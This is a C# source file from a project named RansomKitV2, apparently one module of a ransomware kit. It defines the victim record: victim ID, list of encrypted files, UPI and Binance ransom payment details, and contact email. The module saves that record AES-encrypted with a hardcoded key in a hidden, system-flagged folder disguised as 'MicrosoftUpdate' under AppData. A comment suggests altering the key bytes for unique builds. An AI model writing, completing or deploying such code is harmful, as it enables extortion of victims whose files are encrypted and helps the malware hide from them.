using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace RansomKitV2
{
    // ── Persisted application state ───────────────────────────────
    class AppState
    {
        public string       VictimId        { get; set; } = "";
        public string       MasterKeyHash   { get; set; } = "";   // SHA-256 of master key (for pw verify)
        public List<string> EncryptedFiles  { get; set; } = new();
        public string       UpiId           { get; set; } = "";
        public string       UpiAmount       { get; set; } = "";
        public string       BinanceAddress  { get; set; } = "";
        public string       ContactEmail    { get; set; } = "";
        public long         EncryptedAt     { get; set; }         // Unix timestamp
    }

    // ── State file manager ────────────────────────────────────────
    // State is AES-256-CBC encrypted so it can't be trivially read/tampered.
    // Key is hardcoded here (obfuscated enough for state protection).
    static class StateManager
    {
        // 32-byte AES key  — change these bytes if you want a unique build
        static readonly byte[] _sk = {
            0x57,0x69,0x6E,0x44,0x65,0x66,0x53,0x76,
            0x63,0x4B,0x65,0x79,0x32,0x30,0x32,0x34,
            0x21,0x40,0x23,0x24,0x25,0x5E,0x26,0x2A,
            0x28,0x29,0x5F,0x2B,0x51,0x52,0x53,0x54
        };

        // 16-byte IV
        static readonly byte[] _iv = {
            0x52,0x4B,0x56,0x32,0x49,0x56,0x32,0x30,
            0x32,0x34,0x21,0x40,0x23,0x24,0x25,0x5E
        };

        // Hidden directory under AppData
        static string StateDir  => Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "MicrosoftUpdate");

        static string StatePath => Path.Combine(StateDir, "svc_conf.dat");

        // ── Public API ────────────────────────────────────────────

        public static bool StateExists() => File.Exists(StatePath);

        public static void Save(AppState s)
        {
            Directory.CreateDirectory(StateDir);

            // Mark dir hidden so it's less visible
            try
            {
                var di = new DirectoryInfo(StateDir);
                di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
            }
            catch { }

            string  json  = JsonSerializer.Serialize(s);
            byte[]  plain = Encoding.UTF8.GetBytes(json);
            byte[]  enc   = AesCbc(plain, _sk, _iv, true);

            File.WriteAllBytes(StatePath, enc);

            try
            {
                File.SetAttributes(StatePath,
                    FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
            }
            catch { }
        }

        public static AppState? Load()
        {
            try
            {
                byte[] enc   = File.ReadAllBytes(StatePath);
                byte[] plain = AesCbc(enc, _sk, _iv, false);
                string json  = Encoding.UTF8.GetString(plain);
                return JsonSerializer.Deserialize<AppState>(json);
            }
            catch { return null; }
        }

        public static void Delete()
        {
            try
            {
                // Remove readonly before delete
                if (File.Exists(StatePath))
                {
                    File.SetAttributes(StatePath, FileAttributes.Normal);
                    File.Delete(StatePath);
                }
            }
            catch { }
        }

        // ── Internal AES helper ───────────────────────────────────

        static byte[] AesCbc(byte[] data, byte[] key, byte[] iv, bool enc)
        {
            using var aes = Aes.Create();
            aes.Key     = key;
            aes.IV      = iv;
            aes.Mode    = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;

            using var ms = new MemoryStream();
            using var cs = new CryptoStream(
                ms,
                enc ? aes.CreateEncryptor() : aes.CreateDecryptor(),
                CryptoStreamMode.Write);

            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
            return ms.ToArray();
        }
    }
}
